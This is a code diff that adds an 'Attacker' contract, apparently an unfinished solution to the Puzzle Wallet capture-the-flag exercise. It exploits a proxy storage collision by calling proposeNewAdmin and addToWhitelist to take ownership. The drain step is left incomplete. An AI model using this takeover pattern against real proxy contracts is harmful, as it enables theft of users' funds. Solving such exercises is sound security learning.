@@ -99,3 +99,29 @@ contract PuzzleWallet {
         }
     }
 }
+
+contract Attacker {
+    PuzzleWallet internal puzzleWallet;
+    PuzzleProxy internal puzzleProxy;
+    PuzzleWallet internal puzzleProxyAsWallet;
+    address internal attacker;
+
+    constructor(address  _puzzleWalletProxy, address _puzzleWallet) {
+        puzzleWallet = PuzzleWallet(_puzzleWallet);
+        puzzleProxy = PuzzleProxy(payable(_puzzleWalletProxy));
+        puzzleProxyAsWallet = PuzzleWallet(_puzzleWalletProxy);
+        attacker = msg.sender;
+    }
+
+    function attack() external {
+        puzzleProxy.proposeNewAdmin(address(this));
+        puzzleProxyAsWallet.addToWhitelist(address(this));
+        bytes[] memory data = new bytes[](1);
+        data[0] = abi.encodeWithSignature("withdraw()");
+    }
+
+    function withdraw() public payable {
+        
+    }
+}
+
